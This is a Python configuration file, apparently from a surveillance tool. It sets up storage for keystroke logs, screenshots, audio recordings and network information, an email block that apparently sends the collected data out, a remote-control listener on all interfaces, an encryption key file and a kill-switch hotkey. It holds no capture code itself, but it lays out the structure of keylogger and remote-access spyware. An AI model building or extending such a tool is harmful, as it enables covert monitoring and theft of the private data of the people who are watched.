# config/settings.py
import os
from pathlib import Path
# Removed: from utils.encryption import generate_encryption_key

# Base directory
BASE_DIR = Path(__file__).resolve().parent.parent

# --- Define file paths and directories FIRST ---

# Encryption configuration file path
# This path is defined here and used by the encryption utility.
ENCRYPTION_KEY_FILE = BASE_DIR / 'data' / 'encryption.key' # Store key in data dir

# Log and Data directories
LOG_DIR = BASE_DIR / 'logs'
DATA_DIR = BASE_DIR / 'data'

# Create directories if they don't exist
# Ensure DATA_DIR exists before defining files within it
DATA_DIR.mkdir(parents=True, exist_ok=True)
LOG_DIR.mkdir(parents=True, exist_ok=True)

# Keylogger settings
KEYLOG_FILE = DATA_DIR / 'keylogs.txt'

# Network info settings
NETWORK_INFO_FILE = DATA_DIR / 'network_info.txt'

# Screenshot settings
SCREENSHOT_DIR = DATA_DIR / 'screenshots'
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True) # Also ensure this exists

# Audio settings
AUDIO_FILE = DATA_DIR / 'audio_recording.wav'

# --- Other Configurations ---

# Email configuration
EMAIL_CONFIG = {
    'sender_email': os.getenv('MONITOR_SENDER_EMAIL', 'your_email@example.com'), # Use env vars or defaults
    'sender_password': os.getenv('MONITOR_SENDER_PASSWORD', 'your_password'),
    'receiver_email': os.getenv('MONITOR_RECEIVER_EMAIL', 'receiver@example.com'),
    'smtp_server': os.getenv('MONITOR_SMTP_SERVER', 'smtp.example.com'),
    'smtp_port': int(os.getenv('MONITOR_SMTP_PORT', 587)) # Ensure port is int
}

# Remote control settings
REMOTE_CONTROL_PORT = int(os.getenv('MONITOR_RC_PORT', 5000))
REMOTE_CONTROL_HOST = os.getenv('MONITOR_RC_HOST', '0.0.0.0')

# Kill switch combination (example: Ctrl+Alt+L) - adjust as needed
KILL_SWITCH = {'ctrl', 'alt', 'l'}

# Note: The actual encryption key is no longer generated or loaded here.
# The encryption module will handle loading or generating it when needed.
# The ENCRYPTION_KEY_FILE constant defined above tells the module where to look.

print(f"Base directory: {BASE_DIR}")
print(f"Data directory: {DATA_DIR}")
print(f"Log directory: {LOG_DIR}")
print(f"Encryption key file path: {ENCRYPTION_KEY_FILE}")

